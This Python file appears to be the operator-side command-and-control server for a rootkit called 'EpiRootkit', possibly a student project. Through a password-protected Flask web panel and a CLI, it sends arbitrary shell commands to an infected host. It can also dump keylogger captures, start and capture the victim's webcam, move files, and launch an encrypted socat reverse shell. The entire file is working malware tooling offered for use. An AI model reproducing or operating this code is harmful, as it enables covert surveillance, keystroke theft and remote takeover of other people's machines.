# attacking_program.py
import socket
import threading
import subprocess
import shutil
import time
import getpass
import sys
import os
from flask import Flask, request, render_template, redirect, url_for, flash, send_file
from werkzeug.utils import secure_filename
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

# -------------------- CONFIGURATION --------------------
HOST = '0.0.0.0'
PORT = 4242
BUFFER_SIZE = 4096
PASSWORD = "epiroot"
UPLOAD_FOLDER = "uploads"
DOWNLOAD_FOLDER = "downloads"

# -------------------- FLASK SETUP ----------------------
app = Flask(__name__)
app.secret_key = "epirootkit_secret"
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

rootkit_connection = None
rootkit_address = None
last_response = ""
authenticated = False
connection_lock = threading.Lock()
command_history = []

@app.route('/')
def login():
    global authenticated
    if authenticated:
        return redirect(url_for('dashboard'))
    return render_template("login.html")

@app.route('/auth', methods=['POST'])
def auth():
    global authenticated
    if request.form.get('password') == PASSWORD:
        authenticated = True
        return redirect(url_for('dashboard'))
    flash("❌ Mot de passe incorrect.")
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if not authenticated:
        return redirect(url_for('login'))
    status = "✅ Connecté" if rootkit_connection else "🔴 Déconnecté"
    return render_template("dashboard.html", status=status, rootkit_address=rootkit_address)

@app.route('/terminal')
def terminal():
    if not authenticated:
        return redirect(url_for('login'))
    return render_template("terminal.html", response=last_response)

@app.route('/shell_remote', methods=['GET', 'POST'])
def shell_remote():
    if not authenticated:
        return redirect(url_for('login'))

    shell_output = ""
    if request.method == 'POST':
        port = request.form.get('port')

        try:
            # Vérifier si le port est valide
            port = int(port)
            if port < 1024 or port > 65535:
                shell_output = "❌ Le port doit être entre 1024 et 65535."
            else:
                threading.Thread(target=run_socat_shell, args=(port,)).start()
                time.sleep(1)
                # Envoyer la commande au rootkit pour démarrer le shell distant sur le port choisi
                with connection_lock:
                    if rootkit_connection:
                        rootkit_connection.sendall(f"getshell {port}\n".encode())
                        shell_output = f"🚀 Shell distant lancé sur le port {port}."
                    else:
                        shell_output = "❌ Rootkit non connecté."

        except ValueError:
            shell_output = "❌ Le port doit être un nombre valide."

    return render_template("shell_remote.html", shell_output=shell_output)

@app.route('/keylogger')
def keylogger():
    if not authenticated:
        return redirect(url_for('login'))
    try:
        with connection_lock:
            if rootkit_connection:
                rootkit_connection.sendall(b"keylog_dump\n")
                rootkit_connection.settimeout(2)
                data = rootkit_connection.recv(BUFFER_SIZE).decode()
                rootkit_connection.settimeout(None)
                keylog_data = data.strip()
            else:
                keylog_data = "Aucune connexion au rootkit."
    except Exception as e:
        keylog_data = f"Erreur : {e}"
    return render_template("keylogger.html", keylog_data=keylog_data)

@app.route('/history')
def history():
    if not authenticated:
        return redirect(url_for('login'))
    return render_template("history.html", history=command_history)

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if not authenticated:
        return redirect(url_for('login'))
    if request.method == 'POST':
        uploaded_file = request.files.get('file')
        if uploaded_file:
            filename = secure_filename(uploaded_file.filename)
            save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            uploaded_file.save(save_path)
            flash(f"✅ Fichier '{filename}' uploadé.")
    return render_template("upload.html")

@app.route('/download')
def download():
    if not authenticated:
        return redirect(url_for('login'))
    files = os.listdir(DOWNLOAD_FOLDER)
    return render_template("download.html", files=files)

@app.route('/download/<filename>')
def download_file(filename):
    if not authenticated:
        return redirect(url_for('login'))
    return send_file(os.path.join(DOWNLOAD_FOLDER, filename), as_attachment=True)

@app.route('/send', methods=['POST'])
def send():
    global last_response
    if not authenticated:
        return redirect(url_for('login'))

    cmd = request.form.get('command', '').strip()
    if not cmd:
        return redirect(url_for('terminal'))

    command_history.append(cmd)

    try:
        with connection_lock:
            rootkit_connection.sendall((cmd + "\n").encode())
            if 'killcom' in cmd.lower():
                rootkit_connection.close()
                last_response = {"stdout": "", "stderr": "Connexion terminée."}
                return redirect(url_for('dashboard'))

            rootkit_connection.settimeout(3)
            try:
                chunks = []
                rootkit_connection.settimeout(0.5)
                while True:
                    try:
                        part = rootkit_connection.recv(BUFFER_SIZE)
                        if not part:
                            break
                        chunks.append(part)
                    except socket.timeout:
                        break
                response = b''.join(chunks).decode()

                stdout_marker = "stdout:"
                stderr_marker = "stderr:"

                if stdout_marker in response and stderr_marker in response:
                    start_stdout = response.index(stdout_marker) + len(stdout_marker)
                    start_stderr = response.index(stderr_marker) + len(stderr_marker)

                    stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
                    stderr_content = response[start_stderr:].strip()

                    last_response = {
                        "stdout": stdout_content,
                        "stderr": stderr_content
                    }
                else:
                    last_response = {"stdout": response.strip(), "stderr": ""}
            except socket.timeout:
                last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
            finally:
                rootkit_connection.settimeout(None)

    except Exception as e:
        last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}


    return redirect(url_for('terminal'))

@app.route('/webcam', methods=['GET', 'POST'])
def webcam():
    if not authenticated:
        return redirect(url_for('login'))

    webcam_output = ""
    image_path = "/var/www/html/images/capture.jpg"  # Le chemin où l'image est stockée

    if request.method == 'POST':
        action = request.form.get('action')

        try:
            with connection_lock:
                if rootkit_connection:
                    if action == 'start':
                        rootkit_connection.sendall(b"start_webcam\n")
                        webcam_output = "✅ Webcam démarrée."
                    elif action == 'capture':
                        rootkit_connection.sendall(b"capture_image\n")
                        webcam_output = "📸 Image capturée avec succès."
                    elif action == 'stop':
                        rootkit_connection.sendall(b"stop_webcam\n")
                        webcam_output = "🛑 Webcam arrêtée."
                    else:
                        webcam_output = "❌ Action inconnue."
        except Exception as e:
            webcam_output = f"💥 Erreur : {e}"

    # Vérification si l'image existe
    image_exists = os.path.exists(image_path)

    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)

# ---------------------- SOCKET THREAD ----------------------
def socket_listener():
    global rootkit_connection, rootkit_address
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] Serveur à l'écoute sur {HOST}:{PORT}...")
    connection, address = server_socket.accept()

    with connection_lock:
        rootkit_connection = connection
        rootkit_address = address

    print(f"✅ [+] Rootkit connecté depuis {address[0]}")
    data = connection.recv(1024).decode()
    if data:
        print(f"📥 [rootkit] {data.strip()}")

# ---------------------- CLI MODE ----------------------
def run_socat_shell(port=9001):
    terminal_cmd = None

    if shutil.which("gnome-terminal"):
        terminal_cmd = [
            "gnome-terminal",
            "--",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    elif shutil.which("xterm"):
        terminal_cmd = [
            "xterm",
            "-e",
            f"bash -c 'socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash'"
        ]
    elif shutil.which("konsole"):
        terminal_cmd = [
            "konsole",
            "-e",
            "bash",
            "-c",
            f"socat openssl-listen:{port},reuseaddr,cert=$(pwd)/server.pem,verify=0 file:`tty`,raw,echo=0; exec bash"
        ]
    else:
        print("❌ Aucun terminal compatible trouvé.")
        return

    try:
        subprocess.Popen(terminal_cmd)
        print(f"🚀 Terminal distant lancé sur le port {port}.")
    except Exception as e:
        print(f"💥 Erreur socat : {e}")

def run_cli():
    print("🔐 Authentification requise pour le mode CLI")
    pwd = getpass.getpass("Mot de passe > ")
    if pwd != PASSWORD:
        print("❌ Mot de passe incorrect.")
        return

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print(f"📡 [*] En attente de connexion sur {HOST}:{PORT}...")
    connection, addr = server_socket.accept()
    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")

    def send_commands():
        session = PromptSession("🧠 Vous > ")
        with patch_stdout():
            while True:
                try:
                    line = session.prompt().strip()
                    if not line:
                        continue
                    if line.lower() == "getshell":
                        threading.Thread(target=run_socat_shell).start()
                        time.sleep(1)
                    command_history.append(line)
                    connection.sendall((line + "\n").encode())
                    if line.lower() == "killcom":
                        print("❌ Fermeture demandée.")
                        return
                except (KeyboardInterrupt, EOFError):
                    print("\n⚠️ Interruption utilisateur.")
                    break
                except Exception as e:
                    print(f"💥 Erreur : {e}")
                    break

    def receive_responses():
        while True:
            try:
                data = connection.recv(BUFFER_SIZE).decode()
                if data:
                    print(f"{data.strip()}")
                else:
                    break
            except Exception as e:
                print(f"💥 Erreur de réception : {e}")
                break

    threading.Thread(target=receive_responses, daemon=True).start()
    send_commands()
    connection.close()
    server_socket.close()
    print("🔒 Connexion fermée.")

# ---------------------- MAIN MENU ----------------------
def main():
    print("""
=== 🎛️ EpiRootkit Attacking Program ===
1. 🖥️ Mode CLI
2. 🌐 Mode Web
3. 🧪 Mode Application (à venir)
""")
    choix = input("Choix du mode (1/2/3) > ").strip()
    if choix == '1':
        run_cli()
    elif choix == '2':
        threading.Thread(target=socket_listener, daemon=True).start()
        app.run(host='0.0.0.0', port=5000)
    elif choix == '3':
        print("🔧 Mode application pas encore implémenté.")
    else:
        print("❌ Choix invalide.")

if __name__ == '__main__':
    main()
